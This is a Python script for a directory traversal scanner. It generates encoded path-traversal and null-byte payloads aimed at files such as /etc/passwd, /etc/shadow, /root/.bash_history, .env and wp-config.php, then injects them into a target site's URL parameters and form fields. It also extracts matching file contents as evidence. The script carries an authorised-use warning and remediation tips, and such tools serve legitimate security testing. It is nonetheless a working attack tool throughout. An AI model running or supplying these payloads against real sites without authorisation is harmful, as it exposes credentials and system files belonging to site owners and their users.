#!/usr/bin/env python3
import requests
import re
import sys
import time
import urllib.parse
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from bs4 import BeautifulSoup


def _log(msg: str):
    """Send all output to stderr so wrapper's stdout stays clean JSON."""
    print(msg, file=sys.stderr)


class DirectoryTraversalScanner:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': (
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                'AppleWebKit/537.36 (KHTML, like Gecko) '
                'Chrome/91.0.4472.124 Safari/537.36'
            )
        })
        self.vulnerabilities = []

        # File signatures to detect successful file access
        self.file_signatures = {
            '/etc/passwd': [
                'root:x:0:0:root', 'root:*:0:0:', 'daemon:x:1:1:daemon',
                'bin:x:2:2:bin', '/bin/bash', '/bin/sh'
            ],
            '/etc/shadow': [
                'root:$', 'daemon:*:', 'bin:*:', 'sys:*:'
            ],
            '/etc/hosts': ['127.0.0.1', 'localhost', '::1'],
            '/proc/version': ['Linux version', 'gcc version', 'kernel'],
            '/proc/self/environ': ['PATH=', 'HOME=', 'USER='],
            'boot.ini': [
                '[boot loader]', '[operating systems]', 'timeout=', 'default='
            ],
            'windows/win.ini': [
                '[fonts]', '[extensions]', '[mci extensions]', '[files]'
            ],
            'windows/system.ini': ['[boot]', '[386Enh]', '[drivers]'],
            'windows/system32/drivers/etc/hosts': ['127.0.0.1', 'localhost', '::1'],
            '.htaccess': ['RewriteEngine', 'RewriteRule', 'DirectoryIndex', 'Options'],
            'web.config': ['<configuration>', '<system.web>', '<appSettings>'],
            'config.php': ['$database', '$db_host', '$password', 'mysql_connect'],
            'database.yml': ['development:', 'production:', 'database:', 'username:']
        }

    # ------------------------------------------------------------------
    # Payload generation
    # ------------------------------------------------------------------

    def get_traversal_payloads(self):
        """Generate directory traversal payloads (built once per call, deduplicated)."""
        linux_files = [
            '/etc/passwd', '/etc/shadow', '/etc/hosts',
            '/proc/version', '/proc/self/environ',
            '/root/.bash_history',
            '/var/log/apache/access.log', '/var/log/apache2/access.log'
        ]
        windows_files = [
            'boot.ini', 'windows/win.ini', 'windows/system.ini',
            'windows/system32/drivers/etc/hosts',
            'windows/repair/system', 'windows/repair/software'
        ]
        common_files = [
            '.htaccess', 'web.config', 'config.php', 'database.yml',
            'wp-config.php', '.env', 'composer.json', 'package.json'
        ]
        traversal_sequences = [
            '../', '..\\', '..../', '....\\',
            '..%2f', '..%5c', '..%252f', '..%255c',
            '%2e%2e%2f', '%2e%2e%5c', '0x2e0x2e0x2f',
            '..%c0%af', '..%ef%bc%8f'
        ]
        encoded_sequences = [
            '%2e%2e%2f', '%2e%2e%5c', '%252e%252e%252f',
            '%c0%ae%c0%ae%c0%af', '%uff0e%uff0e%uff0f'
        ]

        payloads = []

        for file_path in linux_files + common_files:
            for seq in traversal_sequences + encoded_sequences:
                for depth in range(1, 8):
                    payloads.append(seq * depth + file_path)

        for file_path in windows_files + common_files:
            for seq in traversal_sequences + encoded_sequences:
                for depth in range(1, 6):
                    payloads.append(seq * depth + file_path)

        # Null-byte variations on first 50
        null_byte = []
        for p in payloads[:50]:
            null_byte += [p + s for s in ('%00', '%00.jpg', '%00.png', '%00.txt')]
        payloads.extend(null_byte)

        # Deduplicate, preserve order, cap at 200
        seen = set()
        unique = []
        for p in payloads:
            if p not in seen:
                seen.add(p)
                unique.append(p)
        return unique[:200]

    # ------------------------------------------------------------------
    # Scan entry point
    # ------------------------------------------------------------------

    def scan_for_traversal(self):
        """Start directory traversal scanning."""
        _log(f" Starting Directory Traversal scan on: {self.target_url}")
        _log("=" * 60)

        if not self.check_connection():
            return

        self.scan_url_parameters()
        self.scan_forms()
        self.scan_common_parameters()
        self.display_results()

    def check_connection(self):
        try:
            response = self.session.get(self.target_url, timeout=10)
            _log(f" Connected to website - Response code: {response.status_code}")
            return True
        except Exception as e:
            _log(f" Connection error: {e}")
            return False

    # ------------------------------------------------------------------
    # Scan modules
    # ------------------------------------------------------------------

    def scan_url_parameters(self):
        _log("\n Scanning URL parameters for directory traversal...")
        parsed_url = urlparse(self.target_url)
        if not parsed_url.query:
            _log("    No parameters found in URL")
            return

        for param_name in parse_qs(parsed_url.query):
            _log(f"\n   Testing parameter: {param_name}")
            self.test_traversal_parameter(param_name, parsed_url, 'GET')

    def scan_forms(self):
        _log("\n Scanning HTML forms for directory traversal...")
        try:
            response = self.session.get(self.target_url, timeout=10)
            soup = BeautifulSoup(response.content, 'html.parser')
            forms = soup.find_all('form')

            if not forms:
                _log("    No forms found on the page")
                return

            _log(f"   Found {len(forms)} form(s)")

            for i, form in enumerate(forms, 1):
                action = form.get('action', '')
                method = form.get('method', 'get').lower()
                _log(f"\n   Testing Form {i}: Action='{action}', Method='{method}'")

                form_data = {}
                injectable_fields = []

                for input_tag in form.find_all('input'):
                    name = input_tag.get('name')
                    itype = input_tag.get('type', 'text').lower()
                    if name:
                        if itype in ('text', 'search', 'file', 'hidden'):
                            form_data[name] = input_tag.get('value', '')
                            if itype != 'hidden':
                                injectable_fields.append(name)
                        elif itype == 'submit':
                            form_data[name] = input_tag.get('value', '')

                for select in form.find_all('select'):
                    name = select.get('name')
                    if name:
                        options = select.find_all('option')
                        form_data[name] = options[0].get('value', '') if options else ''
                        injectable_fields.append(name)

                for textarea in form.find_all('textarea'):
                    name = textarea.get('name')
                    if name:
                        form_data[name] = textarea.text
                        injectable_fields.append(name)

                if injectable_fields:
                    _log(f"    Injectable fields: {', '.join(injectable_fields)}")
                    self.test_traversal_form(action, method, form_data, injectable_fields)
                else:
                    _log("    No injectable fields found")

        except Exception as e:
            _log(f"   Error scanning forms: {e}")

    def scan_common_parameters(self):
        _log("\n Scanning common parameter names...")

        common_params = [
            'file', 'filename', 'path', 'page', 'doc', 'document',
            'root', 'dir', 'folder', 'include', 'inc', 'load',
            'read', 'view', 'download', 'upload', 'template',
            'layout', 'skin', 'style', 'css', 'js', 'script',
            'content', 'data', 'source', 'src', 'url', 'uri'
        ]

        base_url = self.target_url.split('?')[0]

        for param in common_params:
            _log(f"   Testing parameter: {param}")
            parsed_url = urlparse(f"{base_url}?{param}=test")
            self.test_traversal_parameter(param, parsed_url, 'GET')
            time.sleep(0.5)

    # ------------------------------------------------------------------
    # Core test methods
    # ------------------------------------------------------------------

    def test_traversal_parameter(self, param_name, parsed_url, method, limit=50):
        payloads = self.get_traversal_payloads()

        for payload in payloads[:limit]:
            try:
                new_params = parse_qs(parsed_url.query) if parsed_url.query else {}
                new_params[param_name] = [payload]
                test_url = urlunparse((
                    parsed_url.scheme, parsed_url.netloc, parsed_url.path,
                    parsed_url.params, urlencode(new_params, doseq=True),
                    parsed_url.fragment
                ))

                response = self.session.get(test_url, timeout=10)

                if self.check_traversal_success(response, payload):
                    file_accessed = self.identify_accessed_file(response.text)
                    evidence = self._extract_evidence(response.text)

                    vuln = {
                        'type': f'{method} Parameter Directory Traversal',
                        'parameter': param_name,
                        'payload': payload,
                        'url': test_url,
                        'method': method,
                        # Keys expected by wrapper
                        'file': file_accessed,
                        'evidence': evidence,
                        # Extra context kept for display_results
                        'file_accessed': file_accessed,
                        'response_length': len(response.content)
                    }
                    self.vulnerabilities.append(vuln)
                    _log(f"     Traversal found! param={param_name} file={file_accessed}")

                time.sleep(0.3)

            except Exception:
                continue

    def test_traversal_form(self, action, method, form_data, injectable_fields, limit=30):
        payloads = self.get_traversal_payloads()

        for field in injectable_fields:
            _log(f"     Testing field: {field}")

            for payload in payloads[:limit]:
                try:
                    test_data = {**form_data, field: payload}
                    target = self.get_full_url(action)

                    if method == 'post':
                        response = self.session.post(target, data=test_data, timeout=10)
                    else:
                        response = self.session.get(target, params=test_data, timeout=10)

                    if self.check_traversal_success(response, payload):
                        file_accessed = self.identify_accessed_file(response.text)
                        evidence = self._extract_evidence(response.text)

                        vuln = {
                            'type': f'Form {method.upper()} Directory Traversal',
                            'parameter': field,
                            'payload': payload,
                            'url': target,
                            'method': method.upper(),
                            # Keys expected by wrapper
                            'file': file_accessed,
                            'evidence': evidence,
                            # Extra context kept for display_results
                            'file_accessed': file_accessed,
                            'response_length': len(response.content)
                        }
                        self.vulnerabilities.append(vuln)
                        _log(f"       Traversal found! field={field} file={file_accessed}")

                    time.sleep(0.2)

                except Exception:
                    continue

    # ------------------------------------------------------------------
    # Detection helpers
    # ------------------------------------------------------------------

    def check_traversal_success(self, response, payload):
        if response.status_code != 200:
            return False

        text = response.text.lower()

        for signatures in self.file_signatures.values():
            if any(sig.lower() in text for sig in signatures):
                return True

        indicators = [
            'root:x:0:0', '[boot loader]', '[fonts]', 'linux version',
            '127.0.0.1', 'localhost', 'rewriteengine',
            '<configuration>', '$database', 'development:', 'path=', 'home='
        ]
        if any(ind in text for ind in indicators):
            return True

        error_indicators = [
            'failed to open stream', 'no such file or directory',
            'file not found', 'access denied', 'permission denied',
            'cannot read', 'unable to open'
        ]
        if any(err in text for err in error_indicators) and len(text) < 10000:
            return True

        return False

    def identify_accessed_file(self, response_text):
        text = response_text.lower()

        for file_path, signatures in self.file_signatures.items():
            if sum(1 for sig in signatures if sig.lower() in text) >= 2:
                return file_path

        strong = {
            'root:x:0:0': '/etc/passwd',
            '[boot loader]': 'boot.ini',
            'linux version': '/proc/version',
            '[fonts]': 'windows/win.ini',
            'rewriteengine': '.htaccess',
            '<configuration>': 'web.config'
        }
        for indicator, file_path in strong.items():
            if indicator in text:
                return file_path

        return 'Unknown system file'

    def _extract_evidence(self, response_text: str, max_chars: int = 300) -> str:
        """
        Extract the most relevant snippet from the response as evidence.
        The wrapper trims to 200 chars, so we keep up to 300 here.
        """
        for signatures in self.file_signatures.values():
            for sig in signatures:
                idx = response_text.lower().find(sig.lower())
                if idx != -1:
                    start = max(0, idx - 20)
                    return response_text[start:start + max_chars].strip()
        return response_text[:max_chars].strip()

    # ------------------------------------------------------------------
    # Utilities
    # ------------------------------------------------------------------

    def get_full_url(self, action):
        if action.startswith(('http://', 'https://')):
            return action
        if action.startswith('/'):
            parsed = urlparse(self.target_url)
            return f"{parsed.scheme}://{parsed.netloc}{action}"
        base = self.target_url.rstrip('/')
        return f"{base}/{action}" if action else self.target_url

    def display_results(self):
        _log("\n" + "=" * 60)
        _log(" Directory Traversal Vulnerability Scan Results")
        _log("=" * 60)

        if not self.vulnerabilities:
            _log("No directory traversal vulnerabilities detected")
            _log("\n Note:")
            _log("- This doesn't mean the application is completely secure")
            _log("- Manual testing with different encodings may reveal other issues")
            _log("- Consider testing with longer traversal sequences")
        else:
            _log(f"  Found {len(self.vulnerabilities)} directory traversal vulnerability(ies)")

            by_type = {}
            for vuln in self.vulnerabilities:
                by_type.setdefault(vuln['type'], []).append(vuln)

            for vuln_type, vulns in by_type.items():
                _log(f"\n {vuln_type}: {len(vulns)} instance(s)")
                for i, vuln in enumerate(vulns[:3], 1):
                    _log(f"  {i}. Parameter: {vuln['parameter']}")
                    _log(f"     Method: {vuln['method']}")
                    _log(f"     File accessed: {vuln['file_accessed']}")
                    _log(f"     Payload: {vuln['payload']}")
                    _log(f"     URL: {vuln['url']}")
                    _log(f"     Response length: {vuln['response_length']} bytes")
                if len(vulns) > 3:
                    _log(f"     ... and {len(vulns) - 3} more instance(s)")

        _log("\n Security Recommendations:")
        _log("- Validate and sanitize all user input")
        _log("- Use allowlists for permitted file access")
        _log("- Implement proper access controls")
        _log("- Use absolute paths instead of relative paths")
        _log("- Run applications with minimal privileges")
        _log("- Regular security testing and code review")


# ------------------------------------------------------------------
# Entry point — identical to original
# ------------------------------------------------------------------

def main():
    print(" Directory Traversal Vulnerability Scanner")
    print("=" * 45)
    print("  Warning: Use this tool only on websites you own")
    print("or have explicit permission to test")
    print()

    target = input("Enter target website URL: ").strip()

    if not target:
        print(" Please enter a valid URL")
        return

    if not target.startswith(('http://', 'https://')):
        target = 'http://' + target

    print(f"\n Target: {target}")

    scanner = DirectoryTraversalScanner(target)
    scanner.scan_for_traversal()

    print("\n Learn more about Directory Traversal:")
    print("- OWASP Path Traversal Attack Guide")
    print("- Practice on WebGoat, DVWA, or bWAPP")
    print("- Study different encoding techniques")


if __name__ == "__main__":
    main()